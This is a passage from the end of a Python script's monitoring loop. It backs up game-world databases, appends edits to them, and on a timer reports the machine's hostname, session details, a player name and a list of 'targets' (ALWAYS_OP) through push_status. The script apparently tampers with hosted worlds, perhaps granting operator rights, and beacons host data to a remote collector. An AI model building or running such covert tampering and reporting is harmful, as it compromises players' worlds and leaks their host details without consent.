                                            os.path.join(BACKUP_ROOT, stamp, w, "db"),
                                            dirs_exist_ok=True)
                            log_path = active_log_path(db_dir, info)
                            seq = max(max_seq, info["last_seq"]) + 1
                            append_batch(log_path, seq, puts)
                            if db_dir in WORLD_CACHE: del WORLD_CACHE[db_dir]
                            print(f"  [+] {world_name(os.path.join(worlds_dir, w))}: applied")
                            for n in notes: print(f"        · {n}")
                        except Exception as e:
                            print(f"  [!] {w}: {e}")

                status = "online" if is_hosting else "idle"
                payload = {
                    "status":    status,
                    "timestamp": time.time(),
                    "hostname":  socket.gethostname(),
                    "uptime":    int(time.time() - START_TIME),
                    "session":   session,
                    "worlds":    worlds_report,
                    "last_fix":  last_fix_result,
                    "targets":   ALWAYS_OP,
                }

                if active_world_info:
                    if (not active_world_info.get("player")
                        or active_world_info["player"] in ("?", "Unknown")):
                        if session and session.get("player_name"):
                            active_world_info["player"] = session["player_name"]
                            active_world_info["source"] = "memory"
                    payload["host"] = active_world_info

                push_status(payload)

            except Exception as e:
                print(f"[!] loop error: {e}")

            time.sleep(CHECK_INTERVAL)

    except KeyboardInterrupt:
        print("\n[*] stopping…")
        push_status({
            "status":    "offline",
            "timestamp": time.time(),
            "hostname":  socket.gethostname(),
            "targets":   ALWAYS_OP,
        }, force=True)


if __name__ == "__main__":
    main()
